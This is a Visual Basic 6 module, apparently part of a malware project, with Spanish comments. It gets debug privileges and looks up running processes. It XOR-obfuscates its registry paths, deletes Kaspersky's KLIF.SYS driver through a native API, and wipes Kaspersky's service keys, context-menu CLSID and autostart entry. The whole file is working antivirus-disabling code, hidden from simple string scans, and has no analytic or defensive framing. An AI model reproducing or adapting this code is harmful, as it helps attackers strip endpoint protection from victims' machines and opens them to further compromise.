Attribute VB_Name = "mFunctions"

Private Declare Function SHDeleteKey Lib "shlwapi.dll" Alias "SHDeleteKeyA" ( _
ByVal hKey As Long, _
ByVal pszSubKey As String) As Long  ' Funcion encargada de eliminar una clave y todas sus subclaves
       
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" _
Alias "RegOpenKeyExA" ( _
ByVal hKey As Long, _
ByVal lpSubKey As String, _
ByVal ulOptions As Long, _
ByVal samDesired As Long, _
phkResult As Long) As Long

Private Declare Function RegCloseKey Lib "advapi32.dll" ( _
ByVal hKey As Long) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" _
Alias "RegDeleteValueA" ( _
ByVal hKey As Long, _
ByVal lpValueName As String) As Long

Private Const REG_SZ                                As Long = 1
Private Const REG_EXPAND_SZ                         As Long = 2
Private Const REG_BINARY                            As Long = 3
Private Const REG_DWORD                             As Long = 4
Private Const REG_MULTI_SZ                          As Long = 7

Private Const KEY_QUERY_VALUE                       As Long = &H1
Private Const KEY_ALL_ACCESS                        As Long = &H3F
Private Const REG_OPTION_NON_VOLATILE               As Long = 0

Private Const HKEY_CLASSES_ROOT                     As Long = &H80000000
Private Const HKEY_CURRENT_CONFIG                   As Long = &H80000005
Private Const HKEY_CURRENT_USER                     As Long = &H80000001
Private Const HKEY_DYN_DATA                         As Long = &H80000006
Private Const HKEY_LOCAL_MACHINE                    As Long = &H80000002
Private Const HKEY_PERFORMANCE_DATA                 As Long = &H80000004
Private Const HKEY_USERS                            As Long = &H80000003
Private Declare Function ZwDeleteFile Lib "ntdll.dll" ( _
ByRef ObjectAttributes As OBJECT_ATTRIBUTES) As Long

Private Declare Sub RtlInitUnicodeString Lib "ntdll.dll" ( _
ByVal DestinationString As Long, _
ByVal SourceString As Long)

Private Type UNICODE_STRING
        Length              As Integer
        MaximumLength       As Integer
        Buffer              As String
End Type

Private Type OBJECT_ATTRIBUTES
        Length                      As Long
        RootDirectory               As Long
        ObjectName                  As Long
        Attributes                  As Long
        SecurityDescriptor          As Long
        SecurityQualityOfService    As Long
End Type

Private Const OBJ_CASE_INSENSITIVE          As Long = &H40

Public Const SE_SHUTDOWN_PRIVILEGE          As Long = 19
Public Const SE_DEBUG_PRIVILEGE             As Long = 20    ' Privilegio para Debug

Private Const STATUS_NO_TOKEN               As Long = &HC000007C

Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" ( _
ByVal Privilege As Long, _
ByVal Enable As Boolean, _
ByVal Client As Boolean, _
WasEnabled As Long) As Long ' Api Nativa para Ajustar Privilegios

Private Declare Function CreateToolhelp32Snapshot Lib "Kernel32" ( _
ByVal lFlags As Long, _
ByVal lProcessID As Long) As Long
'---
Private Declare Function Process32First Lib "Kernel32" ( _
ByVal hSnapShot As Long, _
uProcess As PROCESSENTRY32) As Long
'---
Private Declare Function Process32Next Lib "Kernel32" ( _
ByVal hSnapShot As Long, _
uProcess As PROCESSENTRY32) As Long
'---
Private Const TH32CS_SNAPHEAPLIST           As Long = &H1
Private Const TH32CS_SNAPPROCESS            As Long = &H2
Private Const TH32CS_SNAPTHREAD             As Long = &H4
Private Const TH32CS_SNAPMODULE             As Long = &H8
Private Const TH32CS_SNAPALL                As Long = (TH32CS_SNAPHEAPLIST Or TH32CS_SNAPPROCESS Or TH32CS_SNAPTHREAD Or TH32CS_SNAPMODULE)
Private Const MAX_PATH                      As Long = 260

Private Type PROCESSENTRY32
        dwSize              As Long
        cntUsage            As Long
        th32ProcessID       As Long
        th32DefaultHeapID   As Long
        th32ModuleID        As Long
        cntThreads          As Long
        th32ParentProcessID As Long
        pcPriClassBase      As Long
        dwFlags             As Long
        szExeFile           As String * MAX_PATH
End Type


'========================================================================================
'======================= Obtener No. de IdentificaciÛn del Proceso ======================
'========================================================================================
Public Function GetPIDByName(ByVal PName As String) As Long
    Dim hSnapShot       As Long
    Dim uProcess        As PROCESSENTRY32
    Dim t               As Long
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0&)
    uProcess.dwSize = Len(uProcess)
    PName = LCase(PName)
    t = Process32First(hSnapShot, uProcess)
    Do While t
        t = InStr(1, uProcess.szExeFile, Chr(0))
        If LCase(Left(uProcess.szExeFile, t - 1)) = PName Then
            GetPIDByName = uProcess.th32ProcessID
            Exit Function
        End If
        t = Process32Next(hSnapShot, uProcess)
    Loop
End Function

'========================================================================================
'============================ Obtener Privilegios de Debug ==============================
'========================================================================================
Public Function EnablePrivilege(ByVal Privilege As Long, Enable As Boolean) As Boolean
    Dim ntStatus        As Long
    Dim WasEnabled      As Long
    ntStatus = RtlAdjustPrivilege(Privilege, Enable, True, WasEnabled)
    If ntStatus = STATUS_NO_TOKEN Then
        ntStatus = RtlAdjustPrivilege(Privilege, Enable, False, WasEnabled)
    End If
    If ntStatus = 0 Then
        EnablePrivilege = True
    Else
        EnablePrivilege = False
    End If
End Function

'========================================================================================
'======================= Simple EncriptaciÛn XOR de las cadenas =========================
'========================================================================================
Public Function Crypt(txt As String) As String
    On Error Resume Next
    Dim x       As Long
    Dim PF      As String
    Dim PG      As String
    
    For x = 1 To Len(txt)
        PF = Mid(txt, x, 1)
        PG = Asc(PF)
        Crypt = Crypt & Chr(PG Xor (216 Mod 255))
    Next
End Function

'========================================================================================
'============== InicializaciÛn de las Propiedades de OBJECT ATTIBUTES ===================
'========================================================================================
Private Sub InicializarOA(ByRef InitializedAttributes As OBJECT_ATTRIBUTES, _
                          ByRef ObjectName As UNICODE_STRING, _
                          ByVal Attributes As Long, _
                          ByVal RootDirectory As Long, _
                          ByVal SecurityDescriptor As Long) 'inicializa las propiedades de OBJECT_ATTRIBUTES
        With InitializedAttributes
                .Length = LenB(InitializedAttributes)
                .Attributes = Attributes
                .ObjectName = VarPtr(ObjectName)
                .RootDirectory = RootDirectory
                .SecurityDescriptor = SecurityDescriptor
                .SecurityQualityOfService = 0
        End With
End Sub

'========================================================================================
'======================= Eliminar Driver KLIF.SYS del Kaspersky =========================
'========================================================================================
Public Function DeleteDriver(StrDriverPath As String) As Boolean
On Error Resume Next
    Dim OA          As OBJECT_ATTRIBUTES
    Dim UStrPath    As UNICODE_STRING
    RtlInitUnicodeString ByVal VarPtr(UStrPath), StrPtr(StrDriverPath) ' Path debe estar en formato de para APIs Nativas "\??\C:\Windows\System32\Drivers\Klif.sys"
    InicializarOA OA, UStrPath, OBJ_CASE_INSENSITIVE, 0, 0
    
    If NT_SUCCESS(ZwDeleteFile(OA)) Then
        DeleteDriver = True
    End If
End Function

'===================================================================================
'========= Eliminar del Registro las claves de Servicios del Kaspersky =============
'===================================================================================
Public Sub KillRegs()
    DeleteAllKeys GetHKEY(3), Crypt("ãÅãåùïÑõ≠™™Ω∂¨õ∑∂¨™∑¥ãΩ¨ÑãΩ™Æ±ªΩ´Ñôéà")              '"SYSTEM\CurrentControlSet\Services\AVP"
    DeleteAllKeys GetHKEY(3), Crypt("ãÅãåùïÑõ≠™™Ω∂¨õ∑∂¨™∑¥ãΩ¨ÑãΩ™Æ±ªΩ´Ñ≥¥È")              '"SYSTEM\CurrentControlSet\Services\kl1"
    DeleteAllKeys GetHKEY(3), Crypt("ãÅãåùïÑõ≠™™Ω∂¨õ∑∂¨™∑¥ãΩ¨ÑãΩ™Æ±ªΩ´Ñìîëû")             '"SYSTEM\CurrentControlSet\Services\KLIF"
    DeleteAllKeys GetHKEY(3), Crypt("ãÅãåùïÑõ≠™™Ω∂¨õ∑∂¨™∑¥ãΩ¨ÑãΩ™Æ±ªΩ´Ñ≥¥±µÌ")            '"SYSTEM\CurrentControlSet\Services\klim5"
    DeleteAllKeys GetHKEY(3), Crypt("ã∑æ¨Øπ™ΩÑìπ´®Ω™´≥°îπ∫")                              '"Software\KasperskyLab"
    DeleteAllKeys GetHKEY(1), Crypt("õîãëúÑ£ººÍÎË‡‡ËıÏ·ÌπıÈÈºÈı∫ËÓÏıËË‡ËÏ‡ΩªÍæªÌ•")       '"CLSID\{dd230880-495a-11d1-b064-008048ec2fc5}" : Quitar del Menu COntextual
    DeleteKey Crypt("ã∑æ¨Øπ™ΩÑï±ª™∑´∑æ¨Ñè±∂º∑Ø´Ñõ≠™™Ω∂¨éΩ™´±∑∂Ñä≠∂"), Crypt("πÆ®"), 3     '"Software\Microsoft\Windows\CurrentVersion\Run", "avp"
End Sub

'===================================================================================
'========================= Eliminar el valor del Registro ==========================
'===================================================================================
Public Sub DeleteKey(sKey, nKey, RegKey)
    On Error Resume Next
    Dim RK          As Long
    Dim l           As Long
    Dim hKey        As Long
    l = RegOpenKeyEx(GetHKEY(RegKey), sKey, 0, KEY_ALL_ACCESS, hKey)
    l = RegDeleteValue(hKey, nKey)
    l = RegCloseKey(hKey)
End Sub

'===================================================================================
'================== Eliminar Claves Y Subclaves del Registro =======================
'===================================================================================
Private Sub DeleteAllKeys(hKey As String, key As String)
    Dim lResult As Long
    lResult = SHDeleteKey(hKey, key)
End Sub

Private Function GetHKEY(RegKey)
    On Error Resume Next
    Select Case RegKey
        Case 1
        GetHKEY = HKEY_CLASSES_ROOT
        Case 2
        GetHKEY = HKEY_CURRENT_USER
        Case 3
        GetHKEY = HKEY_LOCAL_MACHINE
    End Select
End Function



